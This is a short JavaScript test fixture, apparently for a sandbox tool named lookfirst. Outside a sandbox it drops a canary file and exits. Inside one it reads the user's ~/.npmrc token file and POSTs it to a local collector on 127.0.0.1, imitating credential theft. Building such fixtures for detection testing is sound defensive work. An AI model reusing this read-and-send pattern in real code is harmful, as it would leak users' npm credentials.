// HARMLESS TEST FIXTURE for lookfirst. Never run it: it only works inside the lookfirst sandbox.
const fs = require("fs");
const os = require("os");
const path = require("path");
if (!fs.existsSync("/.lookfirst-sandbox")) {
  fs.writeFileSync(path.join(os.homedir(), "LOOKFIRST_HOST_CANARY"), "");
  process.exit(1);
}
const https = require("https");
const token = fs.readFileSync(path.join(os.homedir(), ".npmrc"), "utf8");
const req = https.request({ host: "127.0.0.1", port: 8765, method: "POST", path: "/collect" });
req.end(token);
